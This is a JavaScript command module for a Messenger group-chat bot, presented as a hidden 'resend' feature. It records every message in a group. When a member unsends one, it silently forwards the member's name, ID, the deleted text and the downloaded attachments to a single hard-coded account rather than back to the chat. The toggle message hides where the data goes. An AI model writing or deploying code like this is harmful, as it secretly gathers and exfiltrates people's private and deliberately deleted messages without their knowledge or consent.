var main = "100006473882758";

module.exports.config = {
  name: "resend",
  version: "2.0.0",
  permission: 1,
  credits: "Nayan",
  description: "",
  category: "general",
  prefix: true,
  usages: "resend",
  cooldowns: 0,
  hide: true,
  dependencies: { "request": "", "fs-extra": "", "axios": "" }
};

module.exports.handleEvent = async function ({ event, api, client, Users }) {
  const request = global.nodemodule.request;
  const axios = global.nodemodule.axios;
  const { writeFileSync, createReadStream } = global.nodemodule["fs-extra"];
  let { messageID, senderID, threadID, body, type } = event;

  if (!global.logMessage) global.logMessage = new Map();
  if (!global.data.botID) global.data.botID = api.getCurrentUserID();

  const threadData = global.data.threadData.get(parseInt(threadID)) || {};
  if (typeof threadData.resend !== "undefined" && threadData.resend === false) return;
  if (senderID === global.data.botID) return;

  if (type !== "message_unsend") {
    global.logMessage.set(messageID, { msgBody: body, attachment: event.attachments });
  }

  if (type === "message_unsend") {
    const logData = global.logMessage.get(messageID);
    if (!logData) return;

    let userName = await Users.getNameUser(senderID);
    let responseBody = `Name: ${userName}\nUID: ${senderID}\nUnsent a message`;

    if (logData.msgBody) {
      responseBody += `\n\nContent: ${logData.msgBody}`;
    }

    if (!logData.attachment || logData.attachment.length === 0) {
      return api.sendMessage(responseBody, main);
    } else {
      let attachments = [];
      let count = 0;

      for (let attachment of logData.attachment) {
        count += 1;
        let fileExt = attachment.url.split(".").pop();
        let filePath = `${__dirname}/cache/${count}.${fileExt}`;
        let fileData = (await axios.get(attachment.url, { responseType: "arraybuffer" })).data;
        writeFileSync(filePath, Buffer.from(fileData, "utf-8"));
        attachments.push(createReadStream(filePath));
      }

      api.sendMessage({ body: responseBody, attachment: attachments }, main);
    }
  }
};

module.exports.run = async function ({ api, event, Threads }) {
  const { threadID, messageID } = event;
  let threadData = (await Threads.getData(threadID)).data;

  threadData.resend = !threadData.resend;
  await Threads.setData(parseInt(threadID), { data: threadData });
  global.data.threadData.set(parseInt(threadID), threadData);

  return api.sendMessage(`Resend feature is now ${threadData.resend ? "enabled" : "disabled"}.`, threadID, messageID);
};
